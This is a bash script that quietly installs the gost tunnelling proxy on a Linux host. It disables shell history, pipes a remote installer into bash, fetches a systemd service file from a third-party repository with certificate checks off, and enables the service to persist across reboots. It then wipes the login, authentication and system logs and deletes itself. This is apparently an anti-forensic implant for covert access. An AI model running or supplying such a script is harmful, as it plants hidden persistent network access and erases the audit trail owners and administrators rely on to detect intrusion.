#!/bin/bash

set +o history
cd ~
#apt install curl -y
bash <(curl -fsSL https://github.com/go-gost/gost/raw/master/install.sh) --install
wget --no-check-certificate https://github.com/ConlinChow/drivers/raw/main/gost.service -O gost.service
mv gost.service /etc/systemd/system/gost.service
chmod +x /etc/systemd/system/gost.service

systemctl start gost
systemctl enable gost

echo > /var/log/lastlog
echo > /var/log/utmp
#echo > /var/log/wtmp
echo > /var/log/btmp
cat /dev/null >  /var/log/secure
cat /dev/null >  /var/log/message
cat /dev/null > /var/spool/mail/root
rm -rf install_gost.sh